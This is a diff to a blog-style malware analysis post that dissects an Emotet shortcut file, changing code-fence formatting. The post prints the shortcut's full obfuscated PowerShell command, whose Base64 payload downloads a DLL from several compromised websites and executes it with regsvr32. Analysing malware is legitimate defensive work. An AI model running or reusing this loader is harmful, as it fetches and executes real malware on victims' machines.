@@ -13,16 +13,16 @@ According to VirusTotal, the final payload is Emotet.
 
 ### Investigate Shortcut File
 When reviewing the shortcut file, we see the following Target:
-'''
+```
 C:\Windows\system32\cmd.exe /v:on /c oH3foTTmbaqkzma84gi/Hjtik33DbBFpFOpWwk172sp5TSBv+sahF3cunUGp79vnlDv4zXjR||goto&p^o^w^e^r^s^h^e^l^l.e^x^e -c "&{\[System.Text.Encoding\]::ASCII.GetString(\[System.Convert\]::FromBase64String('JFByb2dyZXNzUHJlZmVyZW5jZT0iU2lsZW5
-'''
+```
 
 So far, what we can see is that the shortcut is calling cmd.exe with a few arguments.
 
 Since the argument passed to powershell.exe is cut off, I ran the shortcut in my VM and located the process execution event in Sysmon to get the entire argument sent to Powershell, listed below:
-'''powershell
+```powershell
 powershell.exe  -c "&{\[System.Text.Encoding\]::ASCII.GetString(\[System.Convert\]::FromBase64String('JFByb2dyZXNzUHJlZmVyZW5jZT0iU2lsZW50bHlDb250aW51ZSI7JGxpbmtzPSgiaHR0cDovL2dtaGVhbHRoY2FyZS5kb3Rob21lLmNvLmtyL2Nzcy9SVDZGRzkvIiwiaHR0cDovL2duci5ndHUuZ2UvYWRtaW4veUtnWU4ySzBtWVkvIiwiaHR0cDovL2hhZnN0cm9tLm51L2ZSOFRBV0VFbS8iLCJodHRwOi8vZ3JlZXpseS5mci93cC1jb250ZW50L084UjFWeVJpMTZYcUtDZ29lVEsvIiwiaHR0cDovL2hjc25ldC5jb20uYnIvd3AtY29udGVudC9lbW1LLyIsImh0dHA6Ly9ncnVwb2JhdGlzdGVsbGEuY29tLmJyL3dwLWNvbnRlbnQvYlYySk1XWnovIik7Zm9yZWFjaCAoJHUgaW4gJGxpbmtzKSB7dHJ5IHtJV1IgJHUgLU91dEZpbGUgJGVudjpURU1QL2FxUHhjY29PUEcuUVl3O1JlZ3N2cjMyLmV4ZSAkZW52OlRFTVAvYXFQeGNjb09QRy5RWXc7YnJlYWt9IGNhdGNoIHsgfX0=')) > "C:\Users\WDAGUtilityAccount\AppData\Local\Temp\tRiZqSzUYZ.ps1"; powershell -executionpolicy bypass -file "\$env:TEMP\tRiZqSzUYZ.ps1"; Remove-Item -Force "$env:TEMP\tRiZqSzUYZ.ps1"}"
-'''
+```
 
 ### Decoding the obfuscated Powershell
 Using CyberChef to decode the Base64 string gives us the following (formatting cleaned up for readability):
@@ -74,6 +74,7 @@ Running Sysinternals Strings on the file shows a number of strings that are pote
 ![PEView exports]({{ site.url }}/assets/img/Pastedimage20220513164914.png)
 While inspecting the PE headers, I also found the compile time is listed as 28 April 2022 at 11:54pm UTC. Opening the file in Dependency Walker shows the same list of function exports as PEView:
 ![Dependancy Walker Exports]({{ site.url }}/assets/img/Pastedimage20220513165110.png)
+
 DLL file summary:
 - Filename: aqPxccoOPG.QYw
 - VirusTotal link: https://www.virustotal.com/gui/file/717082965c7ef28706cf74a56ab841e9cc664e8f8024b1c64d7c411278dee3ae/detection
